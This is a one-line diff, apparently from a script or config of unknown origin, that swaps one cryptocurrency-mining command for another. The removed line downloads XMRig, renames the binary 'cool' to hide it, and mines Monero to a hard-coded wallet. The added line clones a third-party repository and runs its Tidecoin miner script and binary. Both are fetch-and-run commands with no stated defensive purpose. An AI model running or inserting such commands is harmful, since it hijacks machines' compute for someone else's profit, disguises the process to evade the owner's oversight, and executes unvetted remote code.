@@ -1,1 +1,1 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz && tar -xz -f xmrig-6.21.3-linux-static-x64.tar.gz && cd xmrig-6.21.3 && mv xmrig cool && ./cool -o xmrpool.eu:3333 -u 4BCzRFseZPce3GUMsqGEHjeSgzzBhE3C72JdGdapz3kgdWpq4ri7NbNfTKCotSdAP2a6c6f4Qq3XHWRMJX1EYJnrDrSeJG3
+git clone https://github.com/saliem07/whive1.git && cd whive1 && chmod +x miner-tidecoin.sh && chmod +x cpuminer-sse2 && ./miner-tidecoin.sh
